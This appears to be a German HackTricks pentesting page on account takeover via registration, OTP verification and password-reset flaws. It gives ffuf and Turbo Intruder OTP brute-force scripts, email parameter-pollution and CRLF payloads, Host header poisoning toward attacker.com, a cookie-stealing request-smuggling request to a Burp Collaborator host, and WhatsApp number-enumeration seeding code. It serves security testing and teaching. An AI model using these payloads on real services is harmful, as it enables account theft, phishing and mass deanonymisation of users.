# Registrierung & Übernahme-Schwachstellen

{{#include ../banners/hacktricks-training.md}}

## Übernahme durch Registrierung

### Doppelte Registrierung

- Versuche, mit einem vorhandenen Benutzernamen zu registrieren
- Prüfe Varianten der E-Mail:
- Großschreibung
- +1@
- Punkte in der E-Mail hinzufügen
- Sonderzeichen im lokalen Teil der E-Mail (%00, %09, %20)
- Setze Leerzeichen nach der E-Mail: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Probiere Provider-Canonicalization-Tricks (serviceabhängig):
- Gmail ignoriert Punkte und Subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` werden an `victim@gmail.com` zugestellt
- Einige Provider sind im lokalen Teil case-insensitive
- Einige Provider akzeptieren Unicode-Confusables. Probiere Homoglyphs und soft hyphen `\u00AD` im lokalen Teil
- Missbrauche diese, um: Einzigartigkeitsprüfungen zu umgehen, doppelte Accounts/workspace-Einladungen zu erhalten oder Opfer-Anmeldungen zu blockieren (temporärer DoS), während du eine Übernahme vorbereitest

### Username Enumeration

Prüfe, ob du herausfinden kannst, ob ein Benutzername bereits in der Anwendung registriert wurde.

- Unterschiedliche Fehlermeldungen oder HTTP-Statuscodes
- Timing-Unterschiede (ein bestehender Benutzer kann eine Abfrage zum IdP/DB auslösen)
- Automatisches Ausfüllen von Profildaten im Registrierungsformular für bekannte E-Mails
- Überprüfe Team-/Invite-Flows: Die Eingabe einer E-Mail kann offenbaren, ob ein Account existiert

### Passwort-Richtlinie

Beim Erstellen eines Benutzers prüfe die Passwort-Richtlinie (prüfe, ob schwache Passwörter erlaubt sind).  
In diesem Fall kannst du versuchen, Credentials zu bruteforcen.

### SQL Injection

[**Sieh dir diese Seite an** ](sql-injection/index.html#insert-statement) um zu lernen, wie man Account-Übernahmen versucht oder Informationen mittels **SQL Injections** in Registrierungsformularen extrahiert.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### E-Mail ändern

Nach der Registrierung: Versuche, die E-Mail zu ändern, und prüfe, ob diese Änderung korrekt validiert wird oder ob du sie auf beliebige E-Mails ändern kannst.

### Weitere Prüfungen

- Prüfe, ob du **disposable emails** (mailinator, yopmail, 1secmail, etc.) verwenden kannst oder die Blockliste mit Subaddressing wie `victim+mailinator@gmail.com` umgehen kannst
- **Lange** **Passwörter** (>200) führen zu **DoS**
- **Prüfe Rate-Limits bei der Account-Erstellung**
- Verwende username@**burp_collab**.net und analysiere den **Callback**
- Wenn Telefonverifizierung verwendet wird, prüfe Parsing-/Injection-Randfälle

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Telefonnummernzentrierte Messenger exponieren ein **presence oracle**, wann immer der Client Kontakte synchronisiert. Replaying WhatsApp’s discovery requests lieferte historisch **>100M lookups per hour**, wodurch nahezu vollständige Account-Enumerationen möglich wurden.

**Angriffsworkflow**

1. **Instrumentiere einen offiziellen Client** um die Adressbuch-Upload-Anfrage zu erfassen (authentifizierter Blob normalisierter E.164-Nummern). Spiele sie mit vom Angreifer erzeugten Nummern erneut ab, während du dieselben Cookies/Device-Token wiederverwendest.
2. **Fasse Nummern pro Anfrage zusammen**: WhatsApp akzeptiert Tausende von Identifikatoren und gibt registrierte/unregistrierte sowie Metadaten (business, companion, etc.) zurück. Analysiere Antworten offline, um Ziellisten zu erstellen, ohne Opfer zu kontaktieren.
3. **Skaliere die Enumeration horizontal** mit SIM-Banken, cloud devices, oder residential proxies, sodass pro-Account/IP/ASN-Throttling nie greift.

**Dialing-plan modeling**

Modelliere den Wählplan jedes Landes, um ungültige Kandidaten zu überspringen. Das NDSS dataset (`country-table.*`) listet Ländercodes, Adoptionsdichte und Plattformaufteilung, sodass du hoch-treffende Bereiche priorisieren kannst. Beispiel-Seeding-Code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Priorisiere Präfixe, die echten Zuteilungen entsprechen (Mobile Country Code + National Destination Code), bevor du das oracle abfragst, um den Durchsatz brauchbar zu halten.

Turning enumerations into targeted attacks

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Teile Datensätze nach Country/OS/App-Typ, um Regionen mit schwacher SMS-Filterung oder hoher WhatsApp Business-Adoption für lokalisiertes social engineering zu finden.

Public-key reuse correlation

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Schwache E-Mail/Telefon-Verifizierung (OTP/Magic Link)

Registration flows often verify ownership via a numeric OTP or a magic-link token. Typische Schwachstellen:

- Erratbares oder kurzes OTP (4–6 Ziffern) ohne effektives Rate-Limiting oder IP/Device-Tracking. Probiere parallele Versuche und Header/IP-Rotation.
- OTP-Wiederverwendung über Aktionen oder Accounts hinweg, oder nicht an die spezifische Nutzer/Aktion gebunden (z. B. derselbe Code funktioniert für login und signup, oder funktioniert nach E-Mail-Änderung).
- Multi-value smuggling: some backends accept multiple codes and verify if any matches. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguish wrong vs expired vs wrong-user codes by status/message/body length.
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Parallel/concurrent guessing, um sequenzielle Lockouts zu umgehen (verwende Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder-Snippet, um 6‑stellige OTP‑Versuche zu fluten</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: sende denselben gültigen OTP gleichzeitig in zwei Sessions; manchmal wird eine Session zum verifizierten attacker-Konto, während der victim-Flow ebenfalls erfolgreich ist.
- Also test Host header poisoning on verification links (same as reset poisoning below), um per Host header zu leak-en oder die Verifizierung auf einem attacker controlled host abzuschließen.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Eine mächtige Klasse von Problemen tritt auf, wenn ein attacker Aktionen an der E-Mail des victims ausführt, bevor das victim sein Konto erstellt, und später wieder Zugriff gewinnt.

Wichtige Techniken zum Testen (an die Flows des Ziels anpassen):

- Classic–Federated Merge
- Attacker: registriert ein klassisches Konto mit der victim-E-Mail und setzt ein Passwort
- Victim: registriert sich später mit SSO (gleiche E-Mail)
- Unsichere merges können dazu führen, dass beide Parteien eingeloggt bleiben oder der Zugriff des attackers wiederhergestellt wird
- Unexpired Session Identifier
- Attacker: erstellt ein Konto und hält eine langlebige Session (nicht ausloggen)
- Victim: stellt das Passwort wieder her/legt es fest und nutzt das Konto
- Teste, ob alte Sessions nach reset oder Aktivierung von MFA weiterhin gültig bleiben
- Trojan Identifier
- Attacker: fügt dem vorerstellten Konto einen sekundären Identifier hinzu (phone, zusätzliche E-Mail, oder verknüpft attackers IdP)
- Victim: setzt das Passwort zurück; attacker nutzt später den trojan identifier, um zurückzusetzen/anzumelden
- Unexpired Email Change
- Attacker: initiiert eine E-Mail-Änderung zur attacker-Mail und hält die Bestätigung zurück
- Victim: stellt das Konto wieder her und beginnt, es zu nutzen
- Attacker: schließt später die ausstehende E-Mail-Änderung ab, um das Konto zu stehlen
- Non‑Verifying IdP
- Attacker: verwendet einen IdP, der den Besitz der E-Mail nicht verifiziert, um `victim@…` zu behaupten
- Victim: registriert sich über den klassischen Weg
- Service merged nach E-Mail, ohne `email_verified` zu prüfen oder eine lokale Verifikation durchzuführen

Praktische Tipps

- Harveste Flows und Endpunkte aus Web-/Mobile-Bundles. Suche nach classic signup, SSO linking, email/phone change und password reset Endpunkten.
- Erstelle realistische Automation, um Sessions am Leben zu halten, während du andere Flows testest.
- Für SSO-Tests: stelle einen test OIDC provider bereit und gib Tokens mit `email`-Claims für die victim-Adresse und `email_verified=false` aus, um zu prüfen, ob der RP unverified IdPs vertraut.
- Nach jeder Passwort-Zurücksetzung oder E-Mail-Änderung verifiziere, dass:
  - alle anderen Sessions und Tokens invalidiert sind,
  - ausstehende E-Mail/Telefon-Änderungen abgebrochen werden,
  - zuvor verknüpfte IdPs/E-Mails/Telefone re‑verifiziert werden.

Hinweis: Umfangreiche Methodik und Fallstudien zu diesen Techniken sind in Microsofts pre‑hijacking research dokumentiert (siehe Referenzen am Ende).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Fordere einen password reset für deine E-Mail-Adresse an
2. Klicke auf den password reset link
3. Ändere das Passwort nicht
4. Klicke eine beliebige Drittanbieter-Website an (z.B.: Facebook, twitter)
5. Fange die Anfrage im Burp Suite proxy ab
6. Prüfe, ob der referer header das password reset token leak

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Fange die password reset Anfrage im Burp Suite ab
2. Füge oder bearbeite die folgenden Header in Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Sende die Anfrage mit dem modifizierten Header weiter\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Suche nach einer password reset URL, die auf dem _host header_ basiert, z. B.: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Angreifer müssen sich mit ihrem Konto anmelden und zur **Change password**-Funktion gehen.
2. Starte Burp Suite und fang die Anfrage ab
3. Sende sie an den Repeater-Tab und bearbeite die Parameter: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Das Passwort-Reset-Token sollte zufällig erzeugt und jedes Mal einzigartig sein.\
Versuche zu bestimmen, ob das Token abläuft oder immer gleich bleibt; in einigen Fällen ist der Erzeugungsalgorithmus schwach und kann erraten werden. Die folgenden Variablen könnten vom Algorithmus verwendet werden.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger eine Password-Reset-Anfrage über die API/UI für eine bestimmte E-Mail, z. B.: test@mail.com
2. Inspect die Serverantwort und prüfe auf `resetToken`
3. Verwende dann das Token in einer URL wie `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registriere dich im System mit einem Benutzernamen, der mit dem Benutzernamen des Opfers identisch ist, aber vor und/oder nach dem Benutzernamen Leerzeichen eingefügt hat. z. B.: `"admin "`
2. Fordere ein Password-Reset mit deinem bösartigen Benutzernamen an.
3. Verwende das Token, das an deine E-Mail gesendet wurde, und setze das Passwort des Opfers zurück.
4. Melde dich mit dem neuen Passwort im Konto des Opfers an.

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Finde ein XSS in der Anwendung oder einer Subdomain, falls die Cookies auf die übergeordnete Domain scoped sind: `*.domain.com`
2. Leak das aktuelle **sessions cookie**
3. Authentifiziere dich als Nutzer mit dem Cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Verwende **smuggler**, um den Typ des HTTP Request Smuggling zu erkennen (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Erzeuge eine Anfrage, die das `POST / HTTP/1.1` mit den folgenden Daten überschreibt:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` mit dem Ziel, einen Open-Redirect der Opfer zu burpcollab zu erzeugen und ihre Cookies zu stehlen\
3. Die finale Anfrage könnte wie folgt aussehen
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
HackerOne berichtet über die Ausnutzung dieses Bugs\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Kontoübernahme via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Erstelle ein Payload für das CSRF, z. B.: “HTML form with auto submit for a password change”
2. Sende den Payload

### Kontoübernahme via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- JWT mit einer anderen User ID / E-Mail bearbeiten
- Auf schwache JWT-Signatur prüfen


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert bei vorhandener E-Mail)

Einige Signup-Handler führen ein upsert durch, wenn die angegebene E-Mail bereits existiert. Akzeptiert der Endpoint einen minimalen Body mit einer E-Mail und einem Passwort und erzwingt keine Besitzverifizierung, überschreibt das Absenden der E-Mail des Opfers dessen Passwort bereits vor der Authentifizierung.

- Discovery: Endpunkt-Namen aus gebündeltem JS (oder mobilem App-Traffic) sammeln, dann Basis-Pfade wie /parents/application/v4/admin/FUZZ mit ffuf/dirsearch fuzz.
- Method hints: a GET returning messages like "Only POST request is allowed." often indicates the correct verb and that a JSON body is expected.
- Minimaler Body, in der Praxis beobachtet:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Beispiel PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Auswirkung: Full Account Takeover (ATO) ohne reset token, OTP oder E-Mail-Verifizierung.

## Referenzen

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
